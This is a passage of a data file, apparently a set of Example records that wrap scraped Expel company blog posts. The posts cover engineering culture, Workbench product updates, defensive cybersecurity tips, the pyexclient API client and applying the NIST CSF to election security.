away). When joining the Engineering department, one of the first people youll meet with over Zoom is a member of the Core Platform team to walk you through setting up your dev environment. Spoiler alert: Im a big fan of this team. They treat the rest of engineering as well as we treat our customersand they arent alone. There are several teams at Expel whose primary mission is enabling the rest of us. Just check out this screenshot of a chat I had with one of our managers of site reliability engineering (SRE), Reilly Herrewig-Pope (hey, Reilly ), early on: Right off the bat, your manager provides a list of tasks and resources to help you get up to speed. For example, you can browse several recorded videos where subject matter experts introduce a cornerstone of Expels tech stackwhich they helped design and build. Then, when you feel ready, one of your new teammates will hand-pick and shepherd you through your first issue. This is when the real fun begins Completed Jira ticket, five days after Darens start date TIL in year one We move fast and trust our tech At Expel, we use Gitflow for several of our primary repositories. All code is peer reviewed, checked for proper test coverage, and eventually merged into the develop branchkicking off continuous integration and continuous delivery (CI/CD) and ending in a deployment to our staging environment. We cut and merge a new tagged release every day from develop to main, which deploys the latest code to production. These daily releases require trust in the process and infrastructure to catch and handle human errors. I learned this lesson early on. On my third day, I pushed a bad database (DB) migration that wouldve broken our staging environment. Not only did the automated migration process catch the error and rollback the transaction protecting the DB, but when the first Kubernetes pod failed to run the migration, the existing pods stayed live and didnt deploy the broken image. Staging kept working as expected for everyone depending on it, while I chased down and patched my bug. It was a huge relief to know that I had a safety net I didnt have earlier in my career because Expel invested in resilient infrastructure. Having a talented group of SREs designing, building, and maintaining a system that protects us from ourselves is only one part of what makes our daily release cycle work. Every feature team at Expel has a dedicated quality assurance (QA) engineer who considers each issue that needs testing carefully. I pride myself on attention to detail, but, more often than not, our QA still finds edge cases I didnt consider. Thats because their involvement begins long before I merge code and mark an issue as pending acceptance. Our QAs take part in backlog grooming, where they help define testable acceptance criteria and ask questions. This pushes us to confront the devil in the details with all stakeholders present, so that we dont waste time writing code based on incorrect assumptions. Were still a startup If you want to maintain legacy Java code, or push pixels and patch bugs for a PHP application in LTS, this gig might not be for you. Similarly, if you like being a Software Engineer II and knowing that, if you meet your commit quota, youll be eligible for Software Engineer III in two yearsthis probably isnt for you. Even though Expel is no longer a handful of people in a barn with a dream and a whiteboard, it still feels scrappy out of necessity. Our chips are on the table behind two very ambitious bets that require constant evolution and development: We integrate with damn near anything, and We empower humans with the data to make sound judgements, and automate the rest. These bets are what keep things interesting, and demand creative problem solving from our engineers. We have swimlanes but dont operate in silos To build complex systems, software engineers rely on abstraction to hide complexity behind well-defined interfaces. Theres a parallel to this in how our teams are structured at Expel. As an application developer, I dont bear the principal responsibility for designing user interfaces (UIs), setting sprint priorities, or managing infrastructure. Instead Expel offers me a seat at the table, where I can collaborate with designers, product managers, and SREs to build software that solves the highest-priority problems in a way thats scalable. Through these relationships, Ive grown my skills in all of these disciplines and, more importantly, my ability to effectively communicate with people in these roles. We run towards the fire We have a Slack channel called gotime. This is where high-visibility incidents are first reported before theyre spun-off into dedicated channels and Zooms. One of the most remarkable affirmations of Expels culture is the number of people that join the fight immediately following one of these incidentsregardless of who is responsible or who owns the code. Our support of one another extends beyond incidents. Whenever I need help, I always find someone willing to lend a hand. Theres a lot to like about Expel, but the people I have the privilege to work with will always be at the top of that list for me. Opportunities for personal growth In addition to the growth we experience on the day-to-day (thats the nature of the job), Expel encourages us to attend one conference per year and provides a budget of $2,500 to make that happen. This year, I flew out to San Jose for a Postgres conference. I was honestly surprised by how simple it was to get the trip approved, book travel, and submit expenses. Not to mention, we have access to tools like Pluralsight for curated online training. But access to material isnt enough. You also need time and space to invest in continued education. My team let me spend an entire sprint building a foundation in one of the JavaScript (JS) frameworks we use, so that I could approach future issues with more experience and confidence. FYI: we write the majority of our applications in Go, JS, or Python, which gives you the opportunity to become (or remain) proficient in three in-demand languages. Every quarter, we set aside two days called Expel-oritory Time (remember this from the intro?), where the entire product organization can work on whatever they want. Folks often elect to form small, cross-team groups to hack away on some experimental feature, explore our data in a new and interesting way, or use the time to write a blog postlike this one. (Side bar: while I cant yet speak from experience, we also have a 12-month BUILD program for managers, designed to give you practical skills through ongoing learning and practice.) and professional growth Like Ive said, transparency is foundational at Expel. Information normally held close to the chest at other companies, like compensation or the state of the business, is shared openly. That principle applies to our workplace relationships as well. I have candid 1-on-1s with my manager every week where we discuss how things are going, any obstacles she can help me overcome, and what the next steps are for my journey at Expel and beyond. Shes transparent about my performance, and we chat openly about challenges Im facing and what I should focus on to reach the next milestone in my career. From day one, Ive had someone in my corner considering my individual circumstances, who never made me feel like a replaceable cog in a corporate machine. Were building a product that meets customers where they are in their security journey, which means we need people with different points of view at the table. Its part of the reason equity, inclusion, and diversity are hugely important at Expelits another one of those core beliefs: better when different. Were a stronger organization when we recognize, celebrate, and learn from those whose backgrounds and perspectives are different from our own. We also have four employee engagement groups (ERGs) to support that: BOLD (for Black employees), WE (for the women of Expel), The Treehouse (for LGBTQ+ employees), and The Connection (for mental wellbeing)all of which are open (and welcoming) to allies. Weve added more than 180 new Expletives since I started, and there are a whole lot of open positions and opportunities for career advancement (BTW, were hiring ). You wont be pigeonholed here. The opportunity to apply for new roles arises often, giving you a chance to find your perfect fit or try something new. Looking back (and ahead) I knew from the interview process that Expel was the right choice for meand my confidence in that choice has only grown over my first year. Most professions require some amount of continued education, but the pace of change in software engineering takes this requirement up a notch. Working for a company that understands the value of investing in their workforce, and that provides the necessary space and time to experiment, truly supports my personal and professional growth. Every job comes with a unique set of challenges and Expel has no shortage of hard problems. The differenceand the reason Im looking forward to year twoare the people I get to face down those challenges with. If Ive sold you on Expel, or you think its too good to be true and want to ask some questions, check out our open jobs . If youre anything like me, you wont be disappointed.'}) (input_keys={'title'}),
  Example({'title': 'Add context to supercharge your security decisions in ...', 'url': 'https://expel.com/blog/add-context-to-supercharge-your-security-decisions-in-expel-workbench/', 'date': '5 days ago', 'contents': 'Subscribe  EXPEL BLOG Add context to supercharge your security decisions in Expel Workbench Security operations  2 MIN READ  PATRICK DUFFY  MAY 12, 2023  TAGS: Cloud security / MDR / Tech tools Defenders need so much information to make good security decisions in the security operations center (SOC). Situations constantly evolveemployees join and leave the org, new technology gets onboarded, unexpected risks surface, and so much moreits hard for the SOC to keep up with ever-changing conditions throughout the organization. The good news is that all of these changes create contextual information that Expel and our customers use to make smart decisions. The more we know about your environment and your users, the easier it is for our softwareand by extension our SOC analyststo determine which events require remediation. With this in mind, weve introduced a new capability which allows you to add business context to Expel Workbench that helps our SOC team reduce the time-to-decision on alerts and relieve the burden on your team. Adding context to Workbench Heres how it works: On the Context page in Workbench, users can add new context and see all existing context that has been previously added by your organization or our SOC team. Think of context as information about a user or situation thats helpful to know when making a decision about a security alert. Its like a virtual sticky note with directions like: Every time you see user X, be aware that they often travel outside the country. This gives Expel important information about the users location that could help quickly resolve alerts generated about logins from different countries when traveling. On this page, you can edit context, add descriptions and notes, change users and more. You can also see a history of who created the context, who updated it, and when, and you can create categories to quickly group and find types of context being added in Workbench. You can also upload lists of context, like IP addresses or emails that belong to specific groups. Highlight essential information Once added, you can highlight this context in Workbench to call attention to important pieces of information. This serves as a digital sticky note for analysts to share information and learnings about an environment. For example, if we know that specific prefixes are used for admin hosts, we can add context calling out that host is an admin to provide situational awareness so analysts can make the right call on whether and how to act on an alert. This is visible to Expel SOC analysts and customers, meaning you have insight into how analysts work alerts, investigations, and incidents. More valuable ways to add context Context allows you to easily make updates as employees leave the organization or change roles. For example, you can add context for the CEOs email address along with specific intel into Workbench, knowing that CEOs are often targets of phishing attacks. If the CEO leaves the org, you can update or remove the email address and all the associated detections and workflows update automatically. Another way to use context is to make note that specific indicators of compromise (IOC) have been linked to a threat actor within the environment. For example, the SOC can take note that the auto host containment remediation action needs to be taken immediately if a specific IOC is seen as alert. For example, if they see the domain faceb00k.com using zeroes instead of Os. Making Expel work for you Context is just one more way to customize Expel to your specific environment. Be sure to check out the Context page under Organizational Settings to see what context you already have in place and consider additions that would be helpful.'}) (input_keys={'title'}),
  Example({'title': 'An easier way to navigate our security operations platform ...', 'url': 'https://expel.com/blog/an-easier-way-to-navigate-our-security-operations-platform-expel-workbench/', 'date': 'Apr 4, 2023', 'contents': 'Subscribe  EXPEL BLOG An easier way to navigate our security operations platform, Expel Workbench Security operations  4 MIN READ  KIM BIELER  APR 4, 2023  TAGS: MDR / Tech tools When it comes to security operations, speed and ease-of-use are critical for making the best decisions and judgments quickly. Its important that analysts see what they need to see, and can get to the information they need as intuitively as possible. Thats why were excited to announce upgrades to the navigation within our security operations platform, Expel Workbench. Our offerings and capabilities have evolved as the security needs of our customers have grown, so we redesigned the navigation to make it even easier for our clients to manage security operations. The new design makes navigation within Workbench even more flexible, easy-to-use, and downright good looking. And the kicker is that these changes were all driven by youour customers. Lets take a look at whats new. Sidebar navigation The most noticeable change is that we shifted the horizontal navigation to the sidebar. This gives us more room for the essential tools we offer today and the capabilities we plan to build in the future, and makes it easier for you to get to the tools you need, fast. Alert ticker Youll also notice weve moved the alert ticker to the top of the interface, which makes it easier to see the most essential information first. The alert ticker links directly to all critical, high, medium, low, and tuning alerts, and is ever-present throughout Workbench for easy access. Custom detection rules We moved the Custom Detection Rules view from our Settings page to our Detections page. This improvement helps you better understand what will raise Expel alerts in your environment, in addition to any custom lookout, add-to investigation, and noisy alert suppressions created. New location for Actions One of the most important questions our customers ask when working with Expels security operations center (SOC) during an investigation or incident is, Whats on our teams plate? Weve made it simple to get to that to-do list by moving our Actions page to the top of our information architecture in the navigation. With one click, you now see all outstanding to-do items for the team, Expels SOC, or our bots, for any investigation or incident. Breadcrumbs Sometimes you go down a rabbit hole, checking out all the awesome work done during an investigation or incidentwe get it. Weve introduced breadcrumbs at the top of each page to make it simple to jump back to the starting point of your journey through Workbench. Why we made these changes We continuously ask ourselves: how can we make our users jobs easier and their experience in the product more intuitive? We spoke to customers, collected feedback and discovered new ways to simplify how clients use the product today and provide flexibility for how the product will expand in the future. Our mission with the new navigation design therefore centered around four goals: Use navigation space more efficiently and provide room to grow. Create a high-level information architecture that makes even more sense. Reduce clicks to the important and frequently used parts of the platform. Align Workbench with the brand palette and iconography. Since we launched, weve scaled Workbench significantly to keep up with ever-evolving security needs. Weve added half a dozen dashboards; entire new offerings like threat hunting , phishing , and managed detection and response (MDR) support for Kubernetes ; and tools like context, configurable notifications, and the NIST CSF. The original horizontal navigation could no longer expand to accommodate existing features, never mind the accelerating pace of enhancements and new offerings we knew were coming soon. We wanted to make ground-breaking features like the detections strategy UI and additional offerings like hunting easier to find and use. When customers have a consistently good experience across touchpoints, that creates a sense of assurance and trustwhich is especially critical in security, when customers are trusting us to keep their organization safe. Thats why the colors and icons you see on the website now carry through to our Workbench platform. How this helps you We hope that the new navigation makes your work easier and faster. We know that this is an essential tool you use every dayso making it even more enjoyable to use will improve your workflow and help keep your organization safe. Here are a few specific details we think youll appreciate: The features are there when you need it, and out of the way when you dont. You can get where you want to go with fewer clicks. Its easier to see how the platform is structured and where you are in that structure. More of the features are visible and discoverable. A glimpse into the design process To ensure our new Workbench navigation design aligns with your needs, we followed the proven user experience process of research, iteration, testing, and change management. Research: We had a lot of hunches and opinions about what needed to change, but we werent designing for ourselves. So early on we conducted a card-sorting exercise with our customers, asking them to sort the features and categorize them. This research helped us understand what needed to be visible in the main navigation versus what could be listed in the secondary navigation. Iteration: Theres never one right way to solve a design problem. The team experimented with different layouts, colors, icon choices, and organizational schemes. Testing: A key concern for the redesign was how it would affect analyst efficiency. Were proud of our response times, and if the new navigation slowed analysts down by even a second per alert, that could meaningfully affect our service level objectives (SLOs), which was out of the question. So we did a staggered release to the SOC and had analysts kick the tires for several weeks while we watched efficiency metrics. Change management: A project like this doesnt get designed, built, and released overnight. Its a change management effort that involved months of communication, resourcing and planning discussions with engineering, and the creation of a tiger team to execute the design and plan the roll-out. Check it out If you havent logged into Workbench since this update, I encourage you to jump in and explore.'}) (input_keys={'title'}),
  Example({'title': 'An Expel guide to Cybersecurity Awareness Month 2022', 'url': 'https://expel.com/blog/expel-guide-to-cybersecurity-awareness-month-2022/', 'date': 'Oct 4, 2022', 'contents': 'Subscribe  EXPEL BLOG An Expel guide to Cybersecurity Awareness Month 2022 Tips  5 MIN READ  GREG NOTCH  OCT 4, 2022  TAGS: MDR Fall is in the air, which can only mean one thing: Cybersecurity Awareness Month is here. Every year, the National Cybersecurity Alliance (NCA) and the Cybersecurity and Infrastructure Security Agency (CISA) use October to share information and important resources to help people stay safer and more secure online. Its a favorite for us at Expel because its about education and awareness at a time that isnt a reaction to the cyber-threat or attack du jour. Instead, we can take a step back to share information and resources within the defender community and anyone with an online presencewhich, lets face it, is just about everyone. Expel is also a proud Champion of Cybersecurity Awareness Month 2022 a collaborative effort among businesses, government agencies, colleges and universities, associations, nonprofit organizations, and individuals committed to improving online safety and security for all. This year, the CISA and NCA are promoting four key security behaviors to help equip everyone, from consumers to corporations, to better protect their data. To support this initiative, weve curated some Expel resources to help your organization improve its cybersecurity posturethis month, and beyond. 1. ICYMI: always enable multi-factor authentication (MFA), but also have a back-up plan. At this point, enabling MFA (when available) should be a no-brainer. But, we also know that MFA isnt always a silver bullet for protecting your environment. Our security operations center (SOC) has seen examples of this in the wild. Weve responded to phishing attacks that used a man-in-the-middle tactic to send users to a fake Okta login page. (Check out how it went down here .) Weve also seen attackers use BasicAuthentication to bypass MFA and target access to human capital management systems . Based on these novel incidents, here are a few lessons learned you can apply to your own organization: Deploy phish-resistant MFA wherever possible. If FIDO-only factors for MFA are unrealistic, disable email, SMS, voice, and time-based, one-time passwords (TOTPs). Instead, opt for push notifications. Then configure MFA or identity provider policies to restrict access to managed devices as an added layer of security. (More on this in our Quarterly Threat Report for Q2 2022 .) Enforce MFA prompts when users connect to any sensitive apps via app-level MFA. Dont let your sensitive apps (think: Okta, Workday, etc.) be a one-stop shop for attackers. To take it a step further, tell your users to always review the source of the MFA request (if via push notification) to verify the login isnt from an unusual areaand if it is, encourage your people to report strange requests. Finally, be wary of brute force MFA requests, which involve an attacker continuously sending push notifications to the victim until they accept. Let your users know this is something to watch out for. 2. Dont rely on your memory or Sticky Notes to keep track of all your passwords. This year, a global survey conducted by open-source password manager, Bitwarden, revealed that 55% of people rely on their memory to manage passwords . Of those surveyed, only 32% of Americans were required to use a password manager at work. We know that memory can be fickle at best. Password managers are a great way to keep organized for anyone creating multiple (if not dozens) of usernames and passwords to do their job, but they can be difficult for your IT team to enforce. Instead, many businesses opt for a single sign-on (SSO) solution to allow employees to sign into an approved account one time for access to all connected apps. However, easy access for users also makes SSO services a popular target for attackersits part of the reason business application compromise (BAC) attacks are evolving . Regardless, its never a bad idea to encourage employees to create strong, unique passwords for different sites/apps, and of coursewe cant say this one enoughenable MFA whenever possible. Want to be able to forget your passwords? Installing a password manager will help generate strong passwords, keep your accounts safer, and save you from memorizing countless strings of characters. Plus, it makes it easier to deal with constantly changing passwords for sites whose accounts have been compromised. BTW, weve compiled more tips for maintaining security and privacy at home for remote workers (because, lets face it, thats most of us these days), as well as effective ways to encourage more secure behaviors . 3. Stop ignoring that software updates available notification. For security professionals, this might sound like an obvious one, but patching and updating software regularly can help prevent attacks. Vendors are constantly plugging security holes and patching bugs, some of which might represent entry points for attackers. A lot of operating systems and app stores will do this for you automatically, but keep an eye on those notifications prompting an updatepushing it off might be convenient now, but cost you down the line. Updates to web browsers are particularly important, so try to install those right away. So how do you ensure your team keeps up with these updates? Try a combination of gamification and education. Entering employees into raffles for gift cards or other perks for applying OS updates is a generally inexpensive way to reduce risk for your organization and keep folks happy. (FYI: more tips like this from industry leaders grappling with similar challenges from Forbes , including this same sage advice from our own co-founder and CEO, Dave Merkel.) 4. Help your organization avoid taking the bait on a costly phishing scam. Recognizing and reporting phishing schemes is one of the first lines of defense when it comes to protecting your organization. Weve seen this in our SOC on countless occasions, from attackers targeting Amazon Web Services (AWS) login credentials , to malware-poisoned resums aimed at job recruiters and everything in between. Weve also seen how these campaigns can reveal larger, more malicious business email compromise (BEC) attacks if they arent stopped in their tracks (get the full rundown on that incident here ). Fortunately (or not), Expels Phishing team reviews hundreds of emails a day and thousands of emails weekly, so weve picked up a few things about how to protect your organization, including: Prevention starts with proper training. Make sure employees learn to recognize potential red flags associated with phishing emails when they land in their inbox. Even if this means an investment on your part, itll pay dividends in the long run. Spend time on education for specific business units on the phishing campaigns that might target them. Finance teams might encounter financial-themed campaigns with subject lines, such as URGENT:INVOICES, while recruiters may see resum-themed lures. Once they know what to look for, make it easy for people to report suspicious activity. An effective way to do this is through a system for employees to validate suspicious emails or texts. This allows IT to provide guidance to the individual, and gives security team members enough insight to identify trends to sniff out a larger scale attack early on. (More on preventing these scams like this here .) We know. Theres a lot to unpack here, and theres probably more we didnt include for the sake of space and your sanity. But hopefully these resources provide a glimpse into some of the ways you can help your organization toward an overall better security postureeven after October. Were just getting started for Cybersecurity Awareness Month. Check out our #BeCyberSmart resources for curated content to follow along.'}) (input_keys={'title'}),
  Example({'title': 'An inside look at what happened when I finally took ...', 'url': 'https://expel.com/blog/inside-look-what-happened-finally-took-vacation/', 'date': 'Aug 6, 2019', 'contents': 'Subscribe  EXPEL BLOG An inside look at what happened when I finally took a vacation (for realsies) Talent  5 MIN READ  AMY ROSSI  AUG 6, 2019  TAGS: Career / Employee retention / Great place to work / Management Ive got a confession: Im terrible at relaxing. In fact, one of my college entrance essays centered around the fact that I have a hard time sitting still. And I once had a roommate look at me and ask, Do you ever just sit down and do nothing?! Sure, sometimes I sit to watch Netflix and Hulu, but Im usually folding clothes or thinking about next weeks carpool schedule for my kids at the same time. Lets just say Im grateful I discovered the many benefits of yoga years ago. But this blog post isnt about my struggle with knowing how and when to slow down . Its about what happened when I finally took a real vacation  one that involved me and my family with zero cell phone or internet services for a whole seven days. Our view on vacays At Expel, we believe in the importance of taking vacation. Its so important to us that weve included it in our Palimpsest (no, we didnt make up a word )  its a document our executive team developed together, and it outlines what we value about our culture and describes the way we want to work with each other. Among many other attributes we value here, our Palimpsest makes it clear that all employees should feel not just comfortable but encouraged to take the vacation time they need. But heres the thing: Words are just words  in a Palimpsest or anywhere else  unless what you do aligns with what you say (and what you tell everyone else). The TL;DR is this: If I want other people on my team to take real vacations where they truly unplug and stop worrying about whatevers happening back at the office, then Ive got to do the same. Theres nothing worse than the leader who wants people to do as they say and not as they do. So earlier this summer, I boarded a cruise ship in Galveston, Texas to spend a week in Cozumel, Costa Maya and Roatan with my extended family. I purposely didnt buy an international phone plan for the trip. And when someone asked if I wanted (outrageously priced) internet access on the ship  I declined. I declined! That meant no email, Slack, LinkedIn or Instagram for the entire vacation. The seven (not-so-obvious) things I learned from my time away There are plenty of things that happened on my vacation that anyone couldve predicted  all the stuff thats already been well-documented across the interwebs. Without emails and text messages and meeting invites to distract me, I focused on the people around me and got to appreciate the beauty of the ocean. I read the book Where the Crawdads Sing , practiced yoga and made a conscious decision not to worry about anything happening off the ship. I returned from my trip not just with a little more sun, but also some new perspectives  including why its so important for execs to step away and take a real vacation. If you take real vacations, so will your team. A real vacation is one when you take multiple days away and you truly disconnect from the office. This doesnt mean you have to go anywhere exotic or fancy  staycations work too. For this particular vacation, I was gone for one week but others at Expel are committed to taking vacations that are at least two weeks. As our head of user experience, Kim Bieler, once explained to me, two weeks is a proper vacation and a game-changer for your well being. Whatever length of time you choose to take, be sure to talk about your vacations and share pictures and stories. Talking about it is another signal to your team that its healthy and encouraged to take that break and unplug. Your team gets more opportunities to shine. While I was out, my team members stepped up and into work they dont normally do on a day-to-day basis. This was a great experience for them, both in stretching their own capabilities and determining if this new work is something they want to continue to do in the future. It also gave them more of an appreciation for and a front-row seat to what I manage on a day-to-day basis. You discover what you shouldve been delegating all along. If your team can do it while youre out, they can do it when you get back. And handing the reins to your team frees you up to focus on new things. If youre scared that delegating some of the things you normally do makes you replaceable, youre right  but I prefer to think about this concept in a different way. If someone else in my org can step up and take on some of the programs and tasks I used to be responsible for, that means Ive built a great and capable team. And thats a wonderful thing for your business, your employees and you . You discover where youve got process gaps. Weve hired lots of new Expletives lately, which means my team has only been working together for a few months. Stepping away showed me where we needed to improve our processes and better share information. For example we encourage everyone to attend at least one conference a year and we budget $2,500 per person for this experience. While I was out, my team raised some good questions on how to best use this benefit, which prompted us to write some additional guidance for our employees. Your team has more opportunities to build relationships. While I was cruising, the people on my team connected directly and more often with our exec team. I try to encourage those connections while Im in the office, but removing myself from the equation helped this happen even more naturally while I was out. Youre reminded there are more ways than your way to get work done. I know it sounds obvious, but seeing work get done differently is good for so many reasons. One of my favorite parts of my job is coaching managers and helping them think differently about ways to grow and support the people on their teams. During these conversations I draw upon my experience and the techniques Ive developed over time, in the same way others on my team draw upon their own unique experiences. This means that the same conversation can have different outcomes based on the questions asked and guidance provided. Usually in these situations there isnt one right way, but many ways to get to an outcome. I enjoyed returning from vacation and learning from the coaching provided during my absence. You realize why its so important to communicate to your team the difference between a vacation and trip. Many of us blend work and personal time when we go away. I take these kinds of blended trips when I visit California. I get the chance to spend time with my family and friends while still staying connected to the office to get work done. I dont consider these trips to be vacations, but if you look at this travel from the lens of a traditional PTO policy, itd require vacation hours. If you work at a company with a flexible time off policy, the lines start to blur so its important to communicate in advance the type of away time youre taking. If the travel is for a trip, then fine  define your rules. If the travel is for a vacation  then be clear that youll be disconnecting in order to protect your time away. Moral of the story: If you come work at Expel, we want you to take a vacation. For realsies. And if you choose not to come work with us, I hope Ive at least encouraged you to spend a few days fully disconnected. Do it for your own sanity and the development of your team. Now  off to get my Vinyasa on.'}) (input_keys={'title'}),
  Example({'title': 'Announcing Open Source python client (pyexclient) for ...', 'url': 'https://expel.com/blog/open-source-python-client-pyexclient-expel-workbench/', 'date': 'Oct 27, 2020', 'contents': 'Subscribe  EXPEL BLOG Announcing Open Source python client (pyexclient) for Expel Workbench Engineering  2 MIN READ  EVAN REICHARD, DAN WHALEN, MATT BLASIUS, PETER SILBERMAN, ROGER STUDNER, SHAMUS FIELD AND WES WU  OCT 27, 2020  TAGS: Company news / MDR / Tech tools At Expel, we believe that human time is precious, and should be spent only on the tasks that humans are better at than machines  making decisions and building relationships. For the rest of the work, its technology to the rescue. Weve built our platform, Expel Workbench, to provide an environment where our analysts can focus on high-quality decision making. In order to do this, we knew we needed the platform to be like fly paper for inventors  good ideas should be easy to experiment with and get into production. Everything you can do in our platform has a discoverable ( Open API FTW!), standard compliant ( JSON API anyone?) application-programming interface (API) behind it. If you can click it in the user interface (UI), you can automate it with client code. Internally at Expel, weve been taking advantage of our APIs from the very beginning, but weve always hoped to see customers do the same. Introducing pyexclient Today were announcing the release of pyexclient , a python client for the Expel Workbench. Weve built on our learnings over the past few years and have beefed it up with documentation and lots of examples. With the release of pyexclient were including: Snippets : were releasing 25+ code snippets that give, in a few lines each, examples of how to accomplish a specific task. Want to create an investigation or update remediation actions? Weve got you. Scripts : In addition to the snippets, were releasing some fully featured scripts that contain larger use cases. The three were releasing today are: Data Export via CSV : Want to manipulate alert data in your favorite business intelligence (BI) analytics tool? This script provides an example of how to export alert data and fields as a CSV over a specified time range. Poll for new Incident : Want to build automation that runs when bad things are detected? This script provides an example that polls the API for new incidents. It also allows for filtering on keywords. Sync with JIRA : Want to expose artifacts from decisions our analysts make in Expel Workbench to your internal case management system? This script provides an example of syncing Expel activities that require customer action to a Jira project. This includes: Investigations assigned to the customer Investigative actions assigned to the customer Remediation actions assigned to the customer Comments added to an investigation Notebook : Want to see what change point analysis or off-hours alerting looks like in your environment? Weve got you. Were releasing a notebook that implements the following: ipywidget to Auth to Expel Workbench (feel free to re-use this!) Overview of alerts with some basic stats like number of alerts, percentage done without customer involvement and off-hours alerting (you can configure timezone and working hours) Heatmap of alert arrival times Time-to-action by severity w/ bar chart Change point analysis for Expel Alert time series! Heres a screenshot of change point analysis available in the notebook: Example alert time series w/ change points As weve been working with our customers to protect and build out their cloud environments, weve been impressed with the raw power that can be achieved with composing APIs and configurable components. Work that used to require a huge team to customize enterprise software is now just a script away. Were really excited to get this client in the hands of our customers and partners, and see what innovative ways they leverage the information available in Expel Workbench. Interested? We hope so! Getting started is as easy as pip install pyexclient. Head over to our pyexclient documentation page for more details.'}) (input_keys={'title'}),
  Example({'title': 'Applying the NIST CSF to U.S. election security - Expel', 'url': 'https://expel.com/blog/applying-nist-csf-to-election-security/', 'date': 'Sep 24, 2019', 'contents': 'Subscribe  EXPEL BLOG Applying the NIST CSF to U.S. election security Security operations  10 MIN READ  BRUCE POTTER  SEP 24, 2019  TAGS: Framework / Managed security / NIST / Planning / Vulnerability If youve worked in security for any length of time, chances are good that youve heard of the NIST Cyber Security Framework (CSF) . Its a useful tool for helping orgs increase their overall resilience and response to cyber threats. Ive personally used the CSF to guide cybersecurity activities in orgs of all sizes, ranging from startups and local governments to Fortune 500 companies. Even well-known tech brands like Amazon and Microsoft use the CSF to understand where they are and where they want to be with respect to cyber risk. Given the utility of the CSF, Id argue that its not only useful for corporations  its helpful for guiding security activities around processes like our national elections. As we march toward November 2020, theres continued dialogue around how to secure our democracy. Thats because our election systems have been under attack by various adversaries ever since the United States was formed. Over the last few years, though, these attacks have come into sharp focus but the collective response to those attacks hasnt. Is election security an area where the CSF could lend some clarity to the as is and to be of the U.S. election infrastructure? I vote yes. (Pun fully intended.) The 3 challenges for state and local election operations Most of the mechanics of our elections process  like setting up ballot boxes or electronic voting machines, staffing the polls and recording and reporting votes  is managed at the state and local government level. So for the purpose of this CSF exercise, Ill focus on assessing state and local election operations at a high level. The three biggest challenges that these orgs face when it comes to election security are: Lack of standardization: Applying the CSF to election security isnt easy for many reasons  one of the biggest being the fact that theres no single organization thats in charge of U.S. elections. Unlike performing a CSF assessment on a bank or a car company, the election system isnt a monolithic organization with one executive team and one board of directors. Our election systems are governed (and funded) by various U.S., state and local laws and operated by thousands of local agencies and organizations around the country. This diversity in oversight means that any specific finding or recommendation made by any of those entities would need to be implemented by those thousands of organizations  all with varying degrees of cybersecurity knowledge and budgets. No small task. Voting infrastructure: The next challenge is the infrastructure itself. Localities run elections differently  there is no one size fits all approach thats taken by every single city, county and town throughout our country. Some use paper ballots at the voting booth, some go electronic only and some use both. Some have voter registration rolls stored on modern, cloud-based systems while others still use mainframes. Some have money for technology and security improvements but many dont. Think about running a penetration test on hundreds of different systems that have a common function but no common architecture. How would you develop recommendations after that exercise? Training for election volunteers: Lastly, many state and local governments provide training for the volunteers who show up to help you cast your vote  but just like the overall elections system, theres no standardization here. That means the election security training happening in your town might be vastly different than the depth of training happening a few towns over. Is this a hard problem? Yep. Is it unsolvable? Nope. Lets walk down the path of the CSF and see how it could apply to an important part of the election supply chain: state and local governments. U.S. Elections  Identify Looking at the NIST CSF , the first functional area is Identify. In Identify youve got categories that deal with taking inventory of hardware and software systems, cybersecurity governance, cyber risk management and supply chain risks. Unsurprisingly, all these categories apply to securing election systems (Im hoping to quickly sway those who think election security begins at the election booth  it doesnt). Hardware and software inventories are historically complicated even for the big, seemingly tech-savvy enterprises. Its the first CSF control and arguably one of the hardest to do right, because understanding what you own and what youre running is a herculean task in organizations larger than a few dozen people. When you think of the scale of modern election systems, you might think the same is true in that case. But one thing local election boards do very well is hardware inventory. Understanding what voting systems they have and where they physically are at any given moment has been a core part of election security for as long as weve been doing secret ballots. So while there may not be a unified hardware inventory method, theres still a concrete inventory thats well controlled. For those playing along with our NIST self-scoring tool (yeah, we have one of those and its really easy to use  grab your own copy of the NIST CSF scoring tool here ) thats probably a 3 on the verge of a 4. Software is a different animal. Election voter rolls are run on all kinds of different systems and likely the software that runs those systems is not well inventoried (at least in many cases). Also, electronic voting systems are often a black box, so while the vendor that built the system may know whats running on those machines, the local elections boards probably doesnt. Thanks to researchers at organizations like the DEF CON Voting Village , the public now has a better inventory of whats on our voting machines. But even if the public has greater visibility into whats on the machines, that doesnt translate into election boards taking better inventory of the software on their systems. Lets score this area a 2. Another category in Identify is vendor and supply chain management. As a friend of mine says, government contracting is the land of LCTA  lowest cost, technically acceptable. This applies to everything from traffic light controllers to law enforcement communication networks to voting machines. Itll come as no surprise that when you go the LCTA route, security may not be something thats a priority (if its a consideration at all). While voting machines and voter roll systems are well regulated from a procurement perspective, there are wildly varying levels of due diligence done on the supply chain from a cyber risk perspective. Look at the state of Georgia, for example  officials purchased a voting system with known security vulnerabilities because the procurement was too far down the road and there were no perceived viable alternatives. In a conventional enterprise, these sorts of vulnerabilities would have stopped the procurement process cold. But in the relatively small world of government election systems, the transaction happened without a blink of an eye. Im going to rate that a 2, but trending towards a 1. U.S. Elections  Protect Next up in the NIST CSF is the Protect functional area. This part deals explicitly with security controls that are designed to protect an organization from a successful attack by an adversary. Encryption and data protection, identity and access management, training and awareness and how you operate the system are all part of Protect. Again, the level of sophistication of these categories varies depending on your locality. Lets talk about elections and encryption. The biggest forcing function for encryption with elections is the voter rolls and associated personal data. Upcoming laws like the California Consumer Privacy Act (CCPA) will likely force officials to create a regulatory framework that requires encryption for voter rolls. And depending on how broad the definitions are in laws like the CCPA, officials might need to encrypt the vote itself as well since its arguably one of the most personal pieces of information someone gives away. Encrypting it makes perfect sense. We dont have concrete evidence of how much data is or is not encrypted currently in modern voting systems, so for now well have to label this as unknown in our NIST self-scoring tool. Lastly, Protect deals with conventional IT security controls such as change management, vulnerability management and auditing. The quality (or lack thereof) at the local level impacts the assurance of voter registration rolls as well as vote tallying and results communication processes. At the state and local level, these controls are managed by a patchwork of local officials, contractors and vendors. While orgs such as the National Association of State Legislatures have guidelines on how to secure these systems, these guidelines are voluntary and compliance varies from state to state. Looking at these controls, we could score them a solid 2 with a few states trending toward a 3. U.S. Elections  Detect The Detect functional area of the NIST CSF is the sweet spot when it comes to cybersecurity operations. This is where the bad guys are caught doing bad things. Getting a good score in Detect typically means that an org has good security signals being generated by various security tech. From there, analytical technology and humans working in a security operations center are responsible for identifying malicious activity and notifying the appropriate parties. The question here is what state and local governments have to do when it comes to: Security technology installed on endpoints and networks Security signal generated by these technologies Aggregation 